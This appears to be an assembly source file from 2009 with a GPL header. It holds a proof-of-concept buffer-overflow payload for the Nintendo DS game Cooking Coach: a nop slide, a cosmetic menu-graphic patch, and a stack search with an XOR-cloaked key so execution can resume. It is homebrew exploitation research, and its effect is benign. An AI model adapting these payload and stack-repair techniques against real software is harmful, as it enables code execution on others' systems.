#!/usr/bin/env python
#
# Exploit code which takes control of Cooking Coach via a buffer overflow,
# then patches it and "safely" resumes execution.
#
# XXX: Only works with the US version for now. ("VCKE")
#
# Copyright (C) 2009 Micah Dowty <micah@navi.cx>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

	.thumb

	/*
	 * Tiny nop slide, for paranoia...
	 */
	mov r1, #1
	mov r1, #1
	mov r1, #1
	mov r1, #1

	/*
	 * Proof-of-concept game patch.
	 *
	 * This replaces a pointer to the filename for the
	 * background used by the bottom screen on the main menu.
	 * We'll overwrite it with the filename for the top
	 * screen.
	 */

	ldr r1, =0x2012fcc
	ldr r2, [r1]
	ldr r1, =0x2012f98
	str r2, [r1]
	
	/*
	 * We want to safely return to the game, but our last
	 * couple of stack frames are toast because of the
	 * exploit. We actually want to return from the topmost
	 * function that's responsible for setting up the 'welcome'
	 * screen (where we crashed). This function starts
	 * at 0x2057FDC.
	 *
	 * This is a couple stack frames up from where we are.
	 * The saved LR from that stack frame is 0x020f26b0.
	 * We'll search up in our stack for this value, set
	 * the SP, and return.
	 *
	 * Note that a copy of this code is also on the stack,
	 * so we need to cloak our search key so we don't find
	 * ourselves!
	 */

	ldr r1, =(0x020f26b0 ^ 0x55555555)
	ldr r2, =0x55555555
	eor r1, r1, r2
search:
	add sp, sp, #4
	ldr r3, [sp, #4]   @ Look for LR addr - 4
	cmp r1, r3
	bne search

	pop {r4, pc}

	.pool
